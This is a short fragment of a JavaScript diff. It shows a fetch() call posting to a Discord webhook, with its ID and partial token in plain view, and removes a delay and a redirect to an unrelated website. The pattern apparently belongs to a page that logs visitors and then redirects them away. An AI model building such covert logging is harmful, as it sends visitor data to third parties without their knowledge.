@@ -25,7 +25,3 @@ fetch('https://discord.com/api/webhooks/1117662800010039327/4jLfqlqSySpzHX-LDgK3
   })
 })
 
-
-sleep(3);
-
-window.location.replace("https://www.momjunction.com/");
